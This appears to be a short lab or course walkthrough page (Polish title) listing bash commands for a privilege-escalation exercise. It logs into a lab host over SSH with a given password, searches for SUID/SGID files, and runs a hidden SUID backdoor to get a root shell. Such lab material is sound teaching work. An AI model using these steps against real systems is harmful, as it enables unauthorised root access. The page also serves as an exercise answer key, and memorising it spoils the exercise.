---
title: "7.5 - System 2 - szukanie pliku z SUID"
order: 5
---

```bash
ssh system2@192.168.100.107 -p 2202 #Password: pjatk
find / -type f -perm /6000 2>/dev/null #Find SUID/SGID files
/usr/sbin/delete #Hidden SUID backdoor (root shell)
/root/solve
```
